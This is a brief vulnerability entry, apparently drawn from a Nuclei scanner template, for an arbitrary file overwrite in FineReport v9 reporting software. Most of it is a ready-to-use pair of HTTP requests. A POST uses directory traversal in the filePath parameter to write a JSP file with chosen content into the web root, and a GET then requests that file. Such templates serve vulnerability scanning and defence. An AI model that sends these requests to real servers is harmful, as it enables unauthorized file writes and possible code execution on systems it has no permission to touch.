# Vulnerability: FineReport v9 Arbitrary File Overwrite
**Classification:** FINEREPORT
**Source:** Nuclei Template (`fine-report-v9-file-upload.yaml`)

## Description
FineReport ( A business intelligence (BI) and reporting software ) is vulnerable to Arbitrary File Overwrite.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/{{filename}}.jsp HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml;charset=UTF-8

{"__CONTENT__":"{{string}}","__CHARSET__":"UTF-8"}

GET /WebReport/{{filename}}.jsp HTTP/1.1
Host: {{Hostname}}
```

